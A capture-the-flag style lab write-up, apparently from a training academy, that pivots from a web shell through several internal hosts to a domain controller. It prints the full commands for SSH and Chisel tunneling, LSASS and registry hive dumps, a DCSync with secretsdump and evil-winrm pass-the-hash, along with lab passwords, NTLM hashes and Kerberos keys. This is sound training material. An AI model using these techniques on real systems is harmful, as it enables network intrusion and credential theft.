# Pivoting, Tunneling, and Port Forwarding

The exercise provided a Web Shell in subdomain `support.inlanefreight.local`.

**Final objective**: enumeration and pivoting until you reach the Inlanefreight Domain Controller and capture the associated flag.

![][image15]


## Initial Access - Host: inlanefreight.local

First, the initial hostname was identified.

```bash
www-data@inlanefreight.local:…/www/html# hostname
inlanefreight.local
```

Next, the NICs were identified to obtain an internal network.

```bash
www-data@inlanefreight.local:…/www/html# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b0:8f:a2 brd ff:ff:ff:ff:ff:ff
    inet 10.129.108.66/16 brd 10.129.255.255 scope global dynamic ens160
       valid_lft 3458sec preferred_lft 3458sec
    inet6 dead:beef::250:56ff:feb0:8fa2/64 scope global dynamic mngtmpaddr
       valid_lft 86397sec preferred_lft 14397sec
    inet6 fe80::250:56ff:feb0:8fa2/64 scope link
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b0:81:79 brd ff:ff:ff:ff:ff:ff
    inet 172.16.5.15/16 brd 172.16.255.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feb0:8179/64 scope link
       valid_lft forever preferred_lft forever
```

An internal network was identified on the `ens192` interface with the private IPv4 address `172.16.5.15` and a `/16` subnet mask (`255.255.0.0`). This subnet allows for approximately 65,534 possible host addresses, is probably divided into `/23` or `/24` segments.

At this point, it was necessary to look for potential privilege escalation vectors. 

Initially, was checked the `/home` directory and discovered two user accounts:

```bash
www-data@inlanefreight.local:…/www/html# ls -l /home
total 8
drwxr-xr-x 2 administrator administrator 4096 Feb 21  2024 administrator
drwxr-xr-x 4 webadmin      webadmin      4096 Feb 21  2024 webadmin
```

The `www-data` user had read permissions in both directories.

The `/home/webadmin` directory contained a `id_rsa` file and a `.ssh` folder. 

```bash
www-data@inlanefreight.local:…/www/html# ls -la /home/webadmin
total 40
drwxr-xr-x 4 webadmin webadmin 4096 Feb 21  2024 .
drwxr-xr-x 4 root     root     4096 Feb 21  2024 ..
-rw------- 1 webadmin webadmin 1372 Feb 21  2024 .bash_history
-rw-r--r-- 1 webadmin webadmin  220 May  6  2022 .bash_logout
-rw-r--r-- 1 webadmin webadmin 3771 May  6  2022 .bashrc
drwx------ 2 webadmin webadmin 4096 Feb 21  2024 .cache
-rw-r--r-- 1 webadmin webadmin  807 May  6  2022 .profile
drwx--x--x 2 webadmin webadmin 4096 Feb 21  2024 .ssh
-rw-r--r-- 1 root     root      163 May 16  2022 for-admin-eyes-only
-rw-r--r-- 1 root     root     2622 May 16  2022 id_rsa
```

In the `.ssh` folder, the current user does not have read permission, so cannot read its contents. However the `id_rsa` file does have read permission.

Credentials for user `mlefay` (password: `Plain Human work!`) to access `server01` were found in `/home/webadmin/for-admin-eyes-only`.

```bash
www-data@inlanefreight.local:…/www/html# cat /home/webadmin/for-admin-eyes-only
# note to self,
in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
with a password of :
Plain Human work!
```

Although the `www-data` user does not have read permission on `.ssh` folder, it was possible to read the `authorized_keys` file inside it.

```bash
www-data@inlanefreight.local:…/www/html# ls -la /home/webadmin/.ssh/authorized_keys
-rw-r--r-- 1 root root 582 May 16  2022 /home/webadmin/.ssh/authorized_keys
www-data@inlanefreight.local:…/www/html# cat /home/webadmin/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+b0FOmzos/Dfn61d4UDD9YgH+Sw0i+3mI3tZRF18WVyn5Pd8EpkMdo5DWGXX7D8ycX6w78rgMbrF1f6msZtOv9Ys6gQsK74md5RndfxqNT9NYHdythyeIVROBI+6nO3FmllPlQWOs4PXQFIabUd4jmbZqpxlrG+fga1e0lM02yAleB+0WA9DNo4/SItTjYGcgv/49g0Ww/iF7bv7UA5M2T7xRcPI1+1rIz9gGVNyG/5AwZ32iOvQDBIn354MasX2NZYtMKj02CpVk7iLN6ZZOq9NwDikzw5iG2WsTQqqWdfiUMb3e9T0K/Af5PucbzkekflBDi82X69iehGAanpciG+Jj7RYaQnRqVYoVI0eUHZx3y+DCZ6wJVTItYBCxxtx0HrTvhoUaC/M+zR1aWovJNMUAJK23ELko4/bHX1/ndS3nY4Ibmk9ltmRDHJ8b04jHcBZTPqsag2T80Gg8PJzDr5hXxzU1UAlqQgNF1ZDt5JgKJUManOT2wK+NYZVHVSs= webadmin@inlanefreight.local
```

**SSH Access**  
With de `id_rsa` obtained from the `webadmin` directory, it was able to access via SSH as that user and establish a dynamic port forwarding.

```bash
chmod 600 id_rsa && ssh -D 9050 -i id_rsa webadmin@10.129.229.129
```

### Host Discovery

Nmap couldn't scan the hosts via proxychains. The modulo teaches use `-sn` flag to host discovery with nmap in pivoting. It was attempt different ways: 

    proxychains4 nmap -sn 172.16.5.1-250
    proxychains4 nmap -sn 172.16.0.0/16 --max-retries 4 --host-timeout 30s 
    proxychains4 nmap -sn -PS22,80,445 172.16.5.1-200 

```bash
proxychains4 nmap -sn 172.16.0.0/16 --max-retries 5 --host-timeout 30s 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-24 01:12 -03
Nmap done: 65536 IP addresses (0 hosts up) scanned in 546.65 seconds
```

**Bash script - assuming /24 subnet**  
In the `.bash_history` there was a script performed to hosts scan using ping (ICMP) considering a subnet with /24 mask. So was presumed in fact is a /24 subnet and performed a similar bash script, keeping the penultimate octet at 5 (`172.16.5.x`). The active host `172.16.5.3` was discovered.

```bash
webadmin@inlanefreight:~$ for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.022 ms
64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=1.78 ms
```

**Python script using ping (ICMP) - assuming /16 subnet**  
Also, it was created a Python script to send ping (ICMP) using 25 parallel threads to iterate the last octet up to .254, at the end of the cycle it incremented the penultimate octet by 1 and repeated until the scan was complete. In this way, it was confirmed to be a /24 subnet. 

This script should be performed on the target machine (in this case, `inlanefreight.local` Host)

![][image1]

**Python script using TCP - assuming /16 subnet**  
Another Python script was created, this one uses TCP. It is intended to be run from attacker's machine via SSH dynamic port forwarding using proxychains. The script sends TCP connections using `socket.create_connection()`. The script stops when it finds an open port on a host and then moves to the next one.

![][image2]


### Port Enumeration

Again, Nmap could not scan through proxychains. It was used `-sT` and `-Pn` flags.

```bash
lucas@hacking:~/workspace/academy/Skills-Assessment-Pivoting-Tunneling-Port-Forwarding $ proxychains nmap -Pn -sT 172.16.5.35
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-24 19:16 -03
Nmap scan report for 172.16.5.35
Host is up.
All 1000 scanned ports on 172.16.5.35 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 201.42 seconds
```
Probably the exercise awaiting that metasploit `auxiliary/scanner/rdp/rdp_scanner` modulo was used, already assuming that Host is Windows. 

**Python script - TCP**
Nonetheless, a new python script was created to perform port enumeration using `socket.create_connection`. Only essential ports were checked using this script.

![][image3]


## PIVOT-SRV01
Accessing the windows host `172.16.5.35`

```bash
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /dynamic-resolution /drive:share,./dir
```

### Initial checks

**Hostname**
```bash
C:\Windows\system32>hostname
PIVOT-SRV01
```

**Open Ports**
```powershell
PS C:\Users\mlefay> $ports = 21,22,80,81,110,135,137,138,139,161,162,389,396,443,445,3306,3389,4444,5432,5900,5985,5986,8000,8080,8443,8081,8888
PS C:\Users\mlefay>
=== Checking local listening ports via netstat ===
PS C:\Users\mlefay> 
PS C:\Users\mlefay> foreach ($port in $ports) {
>>     if ($netstat -match ":$port\s") {
>>         Write-Output "Port $port"
>>     }
>> }
Port 22
Port 135
Port 139
Port 445
Port 3389
Port 5985

=== Checking open TCP connections (active services) ===
PS C:\Users\mlefay> Get-NetTCPConnection -State Listen | Where-Object { $ports -contains $_.LocalPort } | ForEach-Object { 
>>     Write-Output "Port $($_.LocalPort) - $($_.LocalAddress)"
>> }
Port 5985 - ::
Port 3389 - ::
Port 445 - ::
Port 135 - ::
Port 22 - ::
Port 3389 - 0.0.0.0
Port 139 - 172.16.6.35 
Port 139 - 172.16.5.35
Port 135 - 0.0.0.0
Port 22 - 0.0.0.0
```

**Network Interfaces (NICs)**
```bash
PS C:\Users\vfrank> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::6d2a:3fe1:f34b:9490%4
   IPv4 Address. . . . . . . . . . . : 172.16.5.35
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.5.1

Ethernet adapter Ethernet1 2:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::9467:956e:d9a8:4429%5
   IPv4 Address. . . . . . . . . . . : 172.16.6.35
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . :
```

Another NIC was identified on this host, also configured with a /16 subnet mask. However, as suspected, the /16 network is actually segmented into smaller /24 subnets, either physically (VLANs) or virtually, isolating different network segments.

```bash
webadmin@inlanefreight:~$ ping 172.16.6.35
PING 172.16.6.35 (172.16.6.35) 56(84) bytes of data.
From 172.16.5.15 icmp_seq=1 Destination Host Unreachable
From 172.16.5.15 icmp_seq=2 Destination Host Unreachable
```

**User directory**  
By exploring the `mlefey` user was found another ssh private key `C:\Users\mlefay\.ssh\id_rsa`.


### ProxyJump
A ProxyJump (`-J`) was established using SSH with dynamic port forwarding. 

```bash
ssh -J pivot1-user@pivot1-ip pivot2-user@pivot2-ip
```

Because with `-J` flag do not work using a private key (`-i id_rsa`), a config file was created.

```bash
Host pivot1
HostName 10.129.229.129
User webadmin
IdentityFile id_rsa

Host pivot2
HostName 172.16.5.35
User mlefay
IdentityFile ./PIVOT-SRV01/id_rsa
ProxyJump pivot1
```

```bash
ssh -F ./config -D 9050 pivot2
```

Another option is to use local port forwarding: map port 2222 on the attacker machine to 172.16.5.35:22

```bash
ssh -L 2222:172.16.5.35:22 -i id_rsa webadmin@10.129.229.129
```
```bash
ssh -D 9050 mlefay@127.0.0.1 -p 2222
```

The `mlefay` password was requested, this means the private key found in the `mlefay` directory on the `PIVOT-SRV01` host did not work, probably because the `authorized_keys` file is not present on the host.

![][image4]


### Host Discovery

**ARP Table**  
Analyses the ARP table, two hosts were found in the`172.16.6.x` segment: `172.16.6.25` and `172.16.6.45`. 

```powershell
PS C:\Users\mlefay> arp -a

Interface: 172.16.5.35 --- 0x4
  Internet Address      Physical Address      Type
  172.16.5.15           00-50-56-b0-42-ec     dynamic
  172.16.255.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static

Interface: 172.16.6.35 --- 0x5
  Internet Address      Physical Address      Type
  172.16.6.25           00-50-56-b0-f4-06     dynamic # HOST
  172.16.6.45           00-50-56-b0-c0-36     dynamic # HOST
  172.16.255.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
```

**Using the methods provided by the module**  
Searching for hosts in the `172.16.6.x` segment using the module provided Powershell script with ICMP-ping did not find any host. 

```powershell
1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
```
Nmap with proxychains did not work again.

**Python script - TCP**   
The previous script was adjusted and run on the `172.16.6.x` segment. The same two hosts found in the ARP table were discovered. 

![][image5]

### Privilege escalation
In one of the skill assessment questions was solicited discover the credentials of another vulnerable user, mentioned a previous pentests against Inlanefreight, in this case the Hint mentioned lsass file, the pentest mentioned is the 'Password attacks skills assessment'.

      "In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?"

The dump of the `lsass.DMP` file was performed via Task Manager, transferred to the attacker machine and extract the credentials using `pypykatz` tool.

```bash
pypykatz lsa minidump lsass.DMP
```
```bash
<SNIP>
== LogonSession ==
<SNIP>
   == Kerberos ==
      Username: vfrank
      Domain: INLANEFREIGHT.LOCAL
      Password: Imply wet Unmasked!  #PLAIN TEXT PASSWORD
      password (hex)49006d0070006c0079002000770065007400200055006e006d00610073006b006500640021000000
      AES128 Key: 2e16a00be74fa0bf862b4256d0347e83
      AES256 Key: 0f09825ef5dccf80429d92f8d8c3d4eae29b3f01d95e805e97fe1ca5b81c87e8       
<SNIP>
```
The `vfrank` password was obtained in plain text: `Imply wet Unmasked!`

### Port enumeration
The previous Python script for TCP port scanning did not work through the ProxyJump, all ports were reported as open. Nmap also did not work here.

A Powershell script was developed to search only for essential ports to access the hosts. On `172.16.6.25`, ports `445` and `3389` were open, on `172.16.6.45` only port `22` was open.

![][image6] ![][image7]

                      172.16.6.25                      |                     172.16.6.45  

The next exercise question requested the flag in a windows path. Host `172.16.6.45` appeared to be a Linux host, while `172.16.6.25` was a Windows host. The exploration continued on `172.16.6.25`. 

Furthermore, none of the credentials or private keys found worked for SSH on `172.16.6.45`.

## PIVOTWIN10

```bash
proxychains xfreerdp /v:172.16.6.25 /u:vfrank /p:'Imply wet Unmasked!' /dynamic-resolution /drive:share,./dir
```

```powershell
PS C:\Windows\system32> hostname
PIVOTWIN10
```

### Initial checks

**Open Ports**  
Internal port enumeration confirmed that this host did not have SSH.

```powershell
PS C:\Windows\system32> $ports = 21,22,80,81,110,135,137,138,139,161,162,389,396,443,
>>     445,3306,3389,4444,5432,5900,5985,5986,8000,8080,8443,8081,8888
>>
>> $netstat = netstat -ano | Select-String "LISTENING"
>>
>> foreach ($port in $ports) {
>>     if ($netstat -match ":$port\s") {
>>         Write-Output "Port $port"
>>     }
>> }
>> Get-NetTCPConnection -State Listen | Where-Object { $ports -contains $_.LocalPort } | ForEach-Object {
>>     Write-Output "Port $($_.LocalPort) - $($_.LocalAddress)"
>> }
>>
=== Checking local listening ports via netstat ===
Port 135
Port 139
Port 445
Port 3389
Port 5985

=== Checking open TCP connections (active services) ===
Port 5985 - ::
Port 3389 - ::
Port 445 - ::
Port 135 - ::
Port 3389 - 0.0.0.0
Port 139 - 172.16.10.25    
Port 139 - 172.16.6.25
Port 135 - 0.0.0.0
```
The host `172.16.10.25` was found, and a new network segment `172.16.10.x/24` was discovered.

**Network Interfaces (NICs)**
```powershell
C:\Windows\system32>ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::384a:9740:67cc:4874%9
   IPv4 Address. . . . . . . . . . . : 172.16.6.25
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.6.1

Ethernet adapter Ethernet1 2:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::e1f8:8234:2960:c49d%4
   IPv4 Address. . . . . . . . . . . : 172.16.10.25
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . :
```

There was an SMB network share of the Domain Controller, `AutomateDCAdmin (Z:)`, located on this host. The final flag was available on this share.

![][image8]

However, **this fact was ignored** and the exploitation did not stop here, continuing until to gain access on the Domain Controller host.

### Exploitation

**Lsass dump**  
The real-time antivirus was desabled and dump of lsass.DMP was performed, but as expectedm, nothing was found.

**Confirming to be the Domain Controller**
```powershell
PS C:\Windows\system32> Test-ComputerSecureChannel -Server 172.16.10.5
>> Get-ADDomainController -Discover -NextClosestSiteTest-ComputerSecureChannel -Server 172.16.10.5
>> Get-ADDomainController -Discover -NextClosestSite
>>
True
Domain      : INLANEFREIGHT.LOCAL
Forest      : INLANEFREIGHT.LOCAL
HostName    : {ACADEMY-PIVOT-DC01.INLANEFREIGHT.LOCAL}
IPv4Address : 172.16.10.5
IPv6Address :
Name        : ACADEMY-PIVOT-D
Site        : Default-First-Site-Name
```

### Port Enumeration
Running the Powershell port enumeration script verified that ports `445` and `389` were open, strong indicator that this is the Domain Controller. 

```powershell
PS C:\Windows\system32> $target = "172.16.10.5"
>> $ports = 22,389,445,3389
>>
>> foreach ($port in $ports) {
>>     $tcp = New-Object System.Net.Sockets.TcpClient
>>     try {
>>         $tcp.Connect($target, $port)
>>         Write-Output "Port $port Open"
>>         $tcp.Close()
>>     } catch {}
>> }
>>
Port 389 Open
Port 445 Open
```

### Port Forwarding
At this point, it was necessary to establish a tunnel from the attacker machine to the `PIVOTWIN10` host to access the 172.`16.10.x/24` segment.

The chosen tool for this was Chisel, because it is easy to combine with the pre establish ProxyJump. 

A Chisel server was started on `PIVOT-SRV01` (pivot2) and the client on `PIVOTWIN10` (pivot3) connected to de Chisel server on port 8000, oppening a SCOKS listener on `0.0.0.0:9050` on the server. Finally, an SSH local port forward was created from the attacker to `PIVOT-SRV01` to map the attacker `localhost:9050` to the Chisel server's `127.0.0.1:9050`.

**PIVOT-SRV01**
```powershell
chisel.exe server --port 8000 --reverse
```

**PIVOTWIN10**
```powershell
chisel.exe client 172.16.6.35:8000 R:0.0.0.0:9050:socks
```

**Attacker**
```bash
ssh -F ./config -L 9050:127.0.0.1:9050 pivot2 -N -v
```

### Host Discovery

**ARP Table**  
Analyses the ARP table, one hosts was found in the`172.16.10.x` segment: `172.16.10.5`. 

```powershell
C:\Windows\system32>arp -a

Interface: 172.16.10.25 --- 0x4
  Internet Address      Physical Address      Type
  172.16.10.5           00-50-56-b0-8f-69     dynamic # HOST
  172.16.255.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  239.255.255.250       01-00-5e-7f-ff-fa     static

Interface: 172.16.6.25 --- 0x9
  Internet Address      Physical Address      Type
  172.16.6.35           00-50-56-b0-ba-58     dynamic
  172.16.255.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
```

**Python script - TCP**  
The previous TCP host discovery script was performed through proxychains on the `172.16.10.x/24` segment, however, no new host were discovered. 

![][image10]


### Privilege Escalation
The real purpose of establishing port forwarding to the `PIVOTWIN10` host is to obtain  the `NTDS.dit`, especially  Administrator's hash.

**NTDS Dump**
```bash
proxychains secretsdump.py vfrank:'Imply wet Unmasked!'@172.16.10.5  -just-dc
```
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:29f2d55cc10d46e0fbe05f584670498e:::
vfrank:1103:aad3b435b51404eeaad3b435b51404ee:2e16a00be74fa0bf862b4256d0347e83:::
cdrake:1104:aad3b435b51404eeaad3b435b51404ee:30b2dc708d4030aff8c0f7344f5f28ea:::
The-Watcher:1105:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
ACADEMY-PIVOT-D$:1000:aad3b435b51404eeaad3b435b51404ee:d22a9acfd2bcef5f39ba0c98d78cb97d:::
PIVOT-WIN10$:1106:aad3b435b51404eeaad3b435b51404ee:e231a2e5a73909b38d294a36d688df04:::
PIVOT-SRV01$:1107:aad3b435b51404eeaad3b435b51404ee:21ce18b1a025d4b0b01c0e716e99d476:::
PIVOTWIN10$:1108:aad3b435b51404eeaad3b435b51404ee:a04c5f779121b6109b379cd930d2b75e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:830a511f37c46b3faccd18da299d2c51ec93ff97e947b1be8055971c159c7ebd
Administrator:aes128-cts-hmac-sha1-96:65b0156f651b498a6c9fbab1980748f2
Administrator:des-cbc-md5:e5fbc4f452b6465e
krbtgt:aes256-cts-hmac-sha1-96:7c92263fbd23334a431b65426300ac2dd72d400366284ecea36009bbab38ee5f
krbtgt:aes128-cts-hmac-sha1-96:72c75b3051fafda252d2656b69261ce3
krbtgt:des-cbc-md5:d9f7313dcb57a273
vfrank:aes256-cts-hmac-sha1-96:0f09825ef5dccf80429d92f8d8c3d4eae29b3f01d95e805e97fe1ca5b81c87e8
vfrank:aes128-cts-hmac-sha1-96:fe09f522f725be45e3d53a14516850ac
vfrank:des-cbc-md5:fd3ee03b1a6efd0e
cdrake:aes256-cts-hmac-sha1-96:72ca981a0838e174eb21a7576efeec94937d43551aa45e47eb9b9865e4c78785
cdrake:aes128-cts-hmac-sha1-96:3e8938262e969144cb4b5b6b87d4bb19
cdrake:des-cbc-md5:52e56bc2fd5d016e
The-Watcher:aes256-cts-hmac-sha1-96:8305f316ac4de2ded38f52600851fcb4bbdd83958cbe96e516b51b62bac88055
The-Watcher:aes128-cts-hmac-sha1-96:0866f6b63060aea86feab779909f1b3c
The-Watcher:des-cbc-md5:2ff8b63d68ec9789
ACADEMY-PIVOT-D$:aes256-cts-hmac-sha1-96:bd596403e6155c7cf72011f9809662c7b86a46f3339a38daa10a1dadd85611f3
ACADEMY-PIVOT-D$:aes128-cts-hmac-sha1-96:cd9019c1449041f872e9e48d6539ce70
ACADEMY-PIVOT-D$:des-cbc-md5:32bf23ec861ab6e5
PIVOT-WIN10$:aes256-cts-hmac-sha1-96:fc7c58c80e3be7ef30af74f56f9e27851fed0702708606125727478c34b4a989
PIVOT-WIN10$:aes128-cts-hmac-sha1-96:312323fe804524099f2c649040806011
PIVOT-WIN10$:des-cbc-md5:6294d0139185cdd5
PIVOT-SRV01$:aes256-cts-hmac-sha1-96:de3c83e70c1c44e8b616c6710fc8167853364a96d31b7d1f9e26f88f6bff249c
PIVOT-SRV01$:aes128-cts-hmac-sha1-96:970fa1e187dc54045ce702c1ae9ba2f7
PIVOT-SRV01$:des-cbc-md5:f4b949ba94d946fd
PIVOTWIN10$:aes256-cts-hmac-sha1-96:ced678b3d26e451bd7ced8b850f0e5aff0e36b7cd74fd91a578d17437bd37700
PIVOTWIN10$:aes128-cts-hmac-sha1-96:f030c898d41be2abaa7a1f748558aeb3
PIVOTWIN10$:des-cbc-md5:499d3754985101fb
```

![][image11]

A user named `cdrake` is presend on the NTDS dump, but this user is not present on the accessed hosts.


## ACADEMY-PIVOT-DC01
Because neither RDP nor SSH was available os this host, **evil-winrm** was used to perform Pass-the-Hash attack.

Now, it was possible to obtain the flag without the convinience provided by the exercise. 

![][image12]

### Initial Checks

**Network Interfaces (NICs)**
No new segments were discovered.

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> ipconfig
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.10.5:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.10.5:5985  ...  OK

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::ad28:804f:4ebf:90a1%6
   IPv4 Address. . . . . . . . . . . : 172.16.10.5
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.10.1
```

### Host Discovery
No new host were discovered.

**ARP Table**
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> arp -a
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.10.5:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.10.5:5985  ...  OK

Interface: 172.16.10.5 --- 0x6
  Internet Address      Physical Address      Type
  172.16.10.25          00-50-56-b0-8f-86     dynamic
  172.16.255.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
```

### Open Ports
Because Evil-Winrm was being used, it was necessary to upload a Powershell script file to check the local open ports.

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload ports.ps1
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\ports.ps1
=== Checking local listening ports via netstat ===
Port 135
Port 139
Port 389
Port 445
Port 5985

=== Checking open TCP connections (active services) ===
Port 5985 - ::
Port 445 - ::
Port 389 - ::
Port 135 - ::
Port 389 - 0.0.0.0
Port 139 - 172.16.10.5
Port 135 - 0.0.0.0
```

## Extra - Host: 172.16.6.45

Access to `172.16.6.45` still needed to be gained. 
Only SSH port `22` was open, so it was likely a Linux machine. The attempts was made using three SSH private keys, found in the `mlefay` directories on `PIVOT-SRV01` and `PIVOTWIN10`, and the `vfrank` directory on `PIVOTWIN10`. The `vfrank` `known_hosts` file included an entry for `172.16.6.45`.

![][image9]

The previously found passwords for both users also did not work. LSASS dump was performed on all Windows hosts. 
The hashs obtained from **NTDS** and **LSASS** also correspond to the previously found passwords, and the hash of the other users, such as `webadmin`, `mlefay`, `Administrator` and `cdrake` could not be cracke using **hashcat** -m 1000. 

![][image13]

The **Registry hives** adumps were also performed to obtain additional user hashes, providing new passwords to try on `172.16.6.45` SSH. However, the hashes are the same.

![][image14]

```bash
lucas@hacking:~/workspace/academy/Skills-Assessment-Pivoting-Tunneling-Port-Forwarding/PIVOT-SRV01$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
```
/home/lucas/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xeeefe7d6277a2ae258b4e571104cc289
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
apendragon:1002:aad3b435b51404eeaad3b435b51404ee:222007372da023ed0cdf0a4606bf9b23:::
mlefay:1003:aad3b435b51404eeaad3b435b51404ee:2831bf1e4e0841d882328d5481fb5c92:::
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#7b2aeb20037c28bc44032f7081f304df: (2022-05-17 16:09:37)
INLANEFREIGHT.LOCAL/vfrank:$DCC2$10240#vfrank#cfaf1869163aa26757496e1cd9970316: (2022-05-18 18:38:43)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:21ce18b1a025d4b0b01c0e716e99d476
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x2c1bed0e346af06d64c32dcfd108d8fb3af1e353
dpapi_userkey:0x8a888dcf7becc69d4065caf26b6a534ab160144c
[*] NL$KM 
 0000   A2 52 9D 31 0B B7 1C 75  45 D6 4B 76 41 2D D3 21   .R.1...uE.KvA-.!
 0010   C6 5C DD 04 24 D3 07 FF  CA 5C F4 E5 A0 38 94 14   .\..$....\...8..
 0020   91 64 FA C7 91 D2 0E 02  7A D6 52 53 B4 F4 A9 6F   .d......z.RS...o
 0030   58 CA 76 00 DD 39 01 7D  C5 F7 8F 4B AB 1E DC 63   X.v..9.}...K...c
NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
[*] _SC_DHCPServer 
(Unknown User):Imply wet Unmasked!
[*] _SC_SCardSvr 
(Unknown User):Imply wet Unmasked!
[*] Cleaning up... 
```

```bash
lucas@hacking:~/workspace/academy/Skills-Assessment-Pivoting-Tunneling-Port-Forwarding/PIVOTWIN10$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

```
/home/lucas/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xd33955748b2d17d7b09c9cb2653dd0e8
